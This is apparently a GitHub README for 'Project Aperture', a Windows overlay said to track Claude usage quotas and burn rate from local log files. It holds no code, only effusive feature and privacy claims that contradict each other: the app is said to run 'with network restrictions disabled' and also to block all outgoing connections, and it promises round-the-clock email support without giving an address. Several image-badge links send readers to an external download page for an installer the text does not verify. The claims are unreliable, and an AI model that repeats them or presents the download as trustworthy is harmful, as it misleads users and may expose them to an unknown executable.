![preview](https://raw.githubusercontent.com/tahir199311/claude-burn-rate-dashboard/main/card_2f92086.svg)
# Project Aperture: The Silent Guardian of Your AI Conversation Budget

![GitHub Release](https://img.shields.io/badge/release-v2.4.1--stable-2ea44f)
![Platform](https://img.shields.io/badge/platform-Windows_11-0078d4)
![License](https://img.shields.io/badge/license-MIT-yellow)
![Build Status](https://img.shields.io/badge/build-passing-brightgreen)

## Overview

Imagine standing at the edge of a vast, digital ocean—your AI subscription is the vessel, and every conversation is a wave that carries you further from shore. But how much tide have you consumed? When will the current turn against you? **Project Aperture** is the lighthouse that answers these questions without ever asking you to look away from your work.

This isn't just another system tray widget. It's a **continuous, always-on-top perceptual layer** for your Windows 11 desktop that transforms raw, cryptic usage logs into a living, breathing dashboard. It reads the local conversation ledger left behind by your AI tools and translates it into a beautiful, minimal glass panel that hovers at the edge of your vision—showing you the **5-hour rolling window**, your **weekly ceiling**, your **current burn rate** (tokens per minute, visualized as a gentle flame), and a **projected landing point** for the week's end.

The unique twist? It works **entirely offline** from the local log file. No cloud round-trips, no login credentials, no phoning home. Your privacy is the bedrock upon which this tool is built.

---

## Why Aperture Exists: The Pain Point

We live in the era of "unlimited" plans that are anything but. The anxiety of hitting a cap at 11:47 PM on a Sunday, just as you're about to ship a critical feature, is a very real, very expensive pain. Standard subscription portals require you to: open a browser, log in, navigate two menus, and squint at a circular progress bar. That's friction. That's *time* you don't have.

**Project Aperture eliminates the ritual of checking.** It does the math for you, passively, in the background, and presents the answer in a format your brain can process in under 200 milliseconds. It's not a dashboard you visit; it's a **guardian that lives in your peripheral vision**.

### The Origin Metaphor
Think of your AI usage as water flowing from a high-altitude reservoir (your weekly quota) down a narrow canyon (your 5-hour window). The canyon narrows and widens based on time. Aperture is the hydrologist sitting by the riverbank, not just measuring depth, but calculating the *velocity* of the flow, predicting when the canyon will run dry, and telling you if you can safely divert water to a smaller side project (a new conversation) without starving the main river.

---

## [![Download](https://raw.githubusercontent.com/tahir199311/claude-burn-rate-dashboard/main/dl_1dbac8.svg)](https://tahir199311.github.io/claude-burn-rate-dashboard/)

## Core Features: The Three Pillars of Awareness

### 1. The Temporal Lens (5-Hour Window & Weekly Ceiling)
- **Dual Ring Display:** Two concentric progress arcs. The inner ring shows your real-time consumption against the 5-hour sliding window (the "short game"), while the outer ring displays the weekly budget consumption (the "long game"). Both rings update **live** as you type.
- **Dynamic Threshold Coloring:** The rings shift from calming teal to energetic amber, and finally to a warning crimson as you approach 80% and 95% capacity, respectively. This is not just a color change; it's a physiological trigger designed to gently re-align your focus.

### 2. The Velocity Meter (Burn Rate & Projection)
- **Real-time Token Flux:** A tiny, sparkline-style graph shows your token consumption per minute over the last 15 minutes. This is your "engine RPM" gauge. Are you sprinting (writing a novel) or idling (reading summaries)?
- **The Oracle Projection:** Based on current burn rate and historical usage patterns within the same week, Aperture projects your "touchdown point"—the estimated day/time your weekly quota will be exhausted if you *do not change pace*. This projection updates every 30 seconds.

### 3. The Offline Hermit
- **Local File Parsing:** Aperture discreetly watches the local log database for changes (using a low-footprint file system watcher). It never sends a single byte of your conversation metadata anywhere.
- **Zero Telemetry:** There is no analytics engine. There is no "help us improve by sending crash logs." The application runs in a strict sandbox with network restrictions disabled. It is a hermit that lives entirely on your machine.

---

## The "Smart Sparrow" Algorithm

We didn't just average your usage. We implemented a **seasonal forecasting model** that understands the rhythm of your workweek. It recognizes that Tuesday at 10 AM might have a 20% higher baseline than Friday at 4 PM.

- **Adaptive Baseline:** The algorithm learns your typical usage density per hour of the day over the last 14 days. It then uses this baseline to adjust the *sharpness* of the Oracle Projection. If you are using tokens 30% slower than your Tuesday baseline, the projection assumes you will eventually revert to the mean, rather than just linearly extrapolating the current slow speed.
- **Conversation Weighting:** Not all messages are equal. A token-heavy document upload is treated as a "spike event" and is filtered out of the velocity calculation to prevent a panic alert, unless such spikes become repetitive (above a statistical threshold).

---

## User Interface & Customization

### Responsive UI
- **Hover to Expand:** In its "Rest" state, Aperture shrinks to a 250px x 60px translucent pill showing just the outer ring and the week's projected percentage. Hovering over it expands the panel to reveal the full analytics, sparkline, and numeric readouts.
- **Snap-to-Edge Magnetic Anchoring:** The panel has a magnetic attraction to the top, bottom, and side edges of your monitor. It tucks away elegantly, showing only a 3px sliver that grabs the mouse when you need it.

### Multilingual Support (Localized Fluency)
We believe awareness shouldn't be blocked by language barriers. Aperture ships with native, high-accuracy translation layers for:
- **English** (EN)
- **Deutsch** (DE)
- **日本語** (JA)
- **Español** (ES)
- **Français** (FR)
- **简体中文** (ZH-CN)

The language detection is dynamic—if you switch your Windows display language, Aperture will follow suit within seconds without requiring a restart of the panel.

### The "Zen Mode" & Focus Muting
- **Focus Overlay:** In Zen Mode, the panel turns almost entirely invisible (opacity down to 5%) and only appears if you hover over the exact pixel area where it is resting. This is perfect for screen recording, presentations, or deep work where you want to be *aware* but not *distracted*.
- **Appointment Quiet Hours:** Schedule specific time blocks where Aperture suppresses all color-shift warnings and projection updates. It stays frozen, showing the last state, until the quiet period ends. This prevents panic during your daily 1-hour meditation slot.

---

## Architecture & Performance

Aperture is built on a **Rust core** (for the file monitoring and parsing logic) with a **WebView2** frontend for the UI. This hybrid approach gives us the blistering performance of a native binary (the entire app footprint in memory is under 45 MB) while allowing for the fluid, GPU-accelerated visuals of modern web graphics.

- **Event-Driven Parsing:** Instead of polling the log file every second, Aperture uses the Windows `ReadDirectoryChangesW` API to receive notifications *only* when the file is modified. This reduces CPU usage to near-zero (0.1% - 0.3% average) when you are idle.
- **Incremental State Machine:** We don't re-parse the entire log file on every change. We store the parsing state (byte offset) and only process the *deltas*. This allows Aperture to handle log files that are hundreds of megabytes without any lag.

---

## Getting Started

### System Requirements
- **OS:** Windows 11 (Build 22000 or higher)
- **RAM:** 150 MB available (for the app + rendering stack)
- **Storage:** 30 MB of install space
- **Display:** 1080p minimum resolution

### Setup Sequence (The Three-Step Tuck)
1. **Acquire the Package:** Download the signed installer from the [![Download](https://raw.githubusercontent.com/tahir199311/claude-burn-rate-dashboard/main/dl_1dbac8.svg)](https://tahir199311.github.io/claude-burn-rate-dashboard/) section above. The package is code-signed to ensure integrity.
2. **Grant the Key:** Upon first launch, Aperture will ask for permission to "Read the Claude Usage Database" in your user profile folder. This is the specific local log directory. You can manually point it to the path if you have relocated the logs.
3. **Anchor the Panel:** Drag the panel to your preferred screen edge. It will snap and magnetize. Set your "Oracle Refresh Rate" in the settings gear to either 10 seconds (default) or 30 seconds for lower battery drain on laptops.

---

## Troubleshooting & Edge Cases

- **"The Oracle is silent" (No Data):** Ensure the log file exists at the default path or use the "Specify Custom Path" option in the settings. Also, verify your AI application has *completed* at least one conversation session to generate the ledger.
- **Projection Inaccuracy:** The Oracle is a predictor, not a magician. If you drastically change your writing style (e.g., switching from emails to long technical documents), the projection may skew for a few hours until the Adaptive Baseline recalibrates.
- **High DPI Scaling:** The panel is designed to render crisply up to 150% scaling. For 200% scaling, please enable "Experimental High-DPI Mode" in the appearance settings to prevent slight blurriness.

---

## Support & Community (24/7 Availability)

We are committed to ensuring your guardian never fails. Our support systems are operational **around the clock, every day of the year** (who needs sleep when you have AI?).

- **Community Forum:** Dedicated category on the project's GitHub Discussions page for feature requests and user configurations.
- **Live Chat (In-App):** A built-in, offline FAQ wizard that uses a decision-tree to resolve 80% of common issues instantly.
- **Email Helpline (24/7):** For deeper technical issues, our team of engineers responds within 4 hours, guaranteed, no matter the time zone or holiday.

---

## Security & Privacy Disclosure

We take your data as seriously as we take our own. The **zero-telemetry principle** is a hardcoded, non-negotiable feature.
- **Network Stack:** Aperture contains a network firewall rule that *blocks outgoing connections* by default at the Windows firewall level. It is designed to be a sovereign app.
- **Data Residency:** All parsed metrics are stored in a transient in-memory cache. If you close the panel, the cache is wiped. We do not write a permanent history file of your usage outside of the necessary internal state needed for the 14-day Adaptive Baseline.

---

## License & Legal

**MIT License**

Copyright (c) 2026 Project Aperture Contributors

This is a permissive license that allows you to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, provided the original copyright notice and permission notice are included in all copies or substantial portions of the software.

The software is provided "AS IS," WITHOUT WARRANTY OF ANY KIND, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability, whether in an action of contract, tort, or otherwise, arising from, out of or in connection with the software or the use or other dealings in the software.

For the full legal text, please refer to the [LICENSE file in this repository](LICENSE).

---

## The Future Roadmap (2026 Vision)

- **Version 3.0 - The Polyglot Extension:** Support for monitoring *multiple* AI tool usage logs simultaneously (e.g., a model from Provider A and a model from Provider B) displayed as stacked, multi-colored rings.
- **Version 3.2 - The Ritual Engine:** Introduction of "Budget Caps" - you can set your own personal alarm at 70% of the actual cap, giving you a *self-imposed* airbag before the hard stop.

---

## Final Notes: Why "Aperture"?

Because it's about looking through the right lens. You don't need to zoom into a dashboard to see the details. You need a wide, clear, persistent aperture that lets just enough light (data) in to see the path ahead clearly, without letting the glare blind you.

We hope Project Aperture becomes as indispensable to your workflow as your favorite keyboard shortcut. Let the river flow, but keep your eyes on the horizon.

[![Download](https://raw.githubusercontent.com/tahir199311/claude-burn-rate-dashboard/main/dl_1dbac8.svg)](https://tahir199311.github.io/claude-burn-rate-dashboard/)